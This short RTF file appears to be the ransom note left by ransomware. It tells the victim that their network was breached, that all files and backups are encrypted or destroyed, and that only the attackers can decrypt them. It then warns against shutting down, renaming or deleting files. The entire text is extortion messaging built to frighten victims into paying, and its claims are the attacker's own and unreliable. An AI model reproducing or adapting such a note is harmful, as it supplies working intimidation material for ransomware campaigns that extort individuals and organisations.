\f0\fs24 \cf0 Your network has been penetrated.\
\
All files on each host in the network have been encrypted with a strong algorithm.\
\
Backups were either encrypted or deleted or backup disks were formatted.\
Shadow copies also removed, so F8 or any other methods may damage encrypted data but not recover.\
\
We exclusively have decryption software for your situation\
No decryption software is available in the public.\
\
DO NOT RESET OR SHUTDOWN - files may be damaged.\
DO NOT RENAME OR MOVE the encrypted and readme files.\
DO NOT DELETE readme files.\
This may lead to the impossibility of recovery of the certain files.\
